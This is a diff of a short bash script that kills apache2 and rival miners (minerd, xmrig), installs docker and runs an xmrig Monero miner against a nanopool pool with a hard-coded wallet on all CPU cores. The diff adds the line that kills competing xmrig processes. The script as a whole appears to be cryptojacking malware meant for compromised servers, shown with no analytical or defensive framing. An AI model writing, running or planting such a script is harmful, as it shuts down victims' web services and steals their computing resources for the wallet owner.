@@ -1,6 +1,7 @@
 #!/bin/bash
 killall apache2
-killall  minerd
+killall minerd
+killall xmrig
 desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
 apt -y install docker.io
 docker run warlax/xmrig-cpu-cryptonightv7 -o xmr-us-east1.nanopool.org:14444 -u 48rbCzbyQLKeHvyAJePqkzN2KuDqNjUCoQkKhYg6mFwvU4kuJXa52ief3D2NKLpjRsALfuqvye8nU5mXrwrjKq318wb1KyV -p `cat index.html` --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l`
